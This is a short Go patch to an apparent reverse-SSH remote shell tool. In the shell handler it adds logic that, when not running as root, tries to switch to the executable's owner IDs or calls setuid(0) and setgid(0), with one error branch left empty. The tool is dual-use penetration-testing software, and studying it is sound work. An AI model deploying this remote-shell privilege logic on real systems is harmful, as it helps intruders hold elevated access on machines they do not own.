@@ -11,6 +11,7 @@ import (
 	"os/exec"
 	"strings"
 	"sync"
+	"syscall"
 
 	"github.com/NHAS/reverse_ssh/internal"
 	"github.com/NHAS/reverse_ssh/pkg/logger"
@@ -62,6 +63,28 @@ func shell(user *internal.User, connection ssh.Channel, requests <-chan *ssh.Req
 	if user.Pty == nil {
 		fmt.Fprintf(connection, "Shell without pty not allowed.")
 		return
+	}
+
+	if os.Getuid() != 0 {
+		path, err := os.Executable()
+		if err != nil {
+
+		} else {
+			var i syscall.Stat_t
+			err := syscall.Stat(path, &i)
+			if err != nil {
+				syscall.Setuid(0)
+				syscall.Setgid(0)
+			} else {
+				if os.Geteuid() > int(i.Uid) {
+					syscall.Setuid(int(i.Uid))
+				}
+
+				if os.Getegid() > int(i.Gid) {
+					syscall.Setgid(int(i.Gid))
+				}
+			}
+		}
 	}
 
 	path := ""
